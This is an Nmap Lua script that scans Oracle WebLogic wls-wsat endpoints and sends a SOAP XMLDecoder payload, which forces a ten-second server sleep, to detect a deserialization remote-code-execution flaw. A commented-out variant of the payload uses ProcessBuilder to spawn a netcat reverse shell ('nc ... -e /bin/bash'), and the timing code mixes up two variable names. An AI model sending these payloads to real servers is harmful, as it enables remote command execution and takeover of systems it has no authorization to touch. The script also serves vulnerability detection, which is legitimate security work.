local http = require "http"
local string = require "string"
local os = require "os"
local endPoint={"/wls-wsat/CoordinatorPortType","/wls-wsat/RegistrationPortTypeRPC","/wls-wsat/ParticipantPortType","/wls-wsat/RegistrationRequesterPortType","/wls-wsat/CoordinatorPortType11","/wls-wsat/RegistrationPortTypeRPC11","/wls-wsat/ParticipantPortType11","/wls-wsat/RegistrationRequesterPortType11"}
local cms={} 


portrule = function(host, port)
	if (port.state=="open" and port.protocol=="tcp") then
		for i=1,8 do
			local resp= http.get(host,port,endPoint[i])
			if resp.status == 200 then
				cms['endpoint']=endPoint[i]
				return true 
			end
		end
	end
	return false
end

action = function (host, port)

	http.useragent="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"

	local option={} 
	option['header']={} 
	option['header']['Content-Type']='text/xml' 
	option['header']['Accept-Encoding']='gzip, deflate'
	option['timeout']='15000' --timeout 
	option['content']='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>10000</long></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
--	option['content']='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>nc 127.0.0.1 4444 â€“e /bin/bash</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'

	
	starTime=os.time() --salvo il tempo
	local resp=http.generic_request(host,port,'POST',cms['endpoint'],option) 
		if (resp.status==200 or resp.status==500) then 
			stopTime=os.time() 
		else
			stopTime=startTime  
		end

	delta=stopTime-starTime 
	
	if (delta >=9) then
		if (delta <=12) then
			cms['VULNERABLE']='YES'
			return cms	
		end
	end

	return 'NOT VULNERABLE'
end

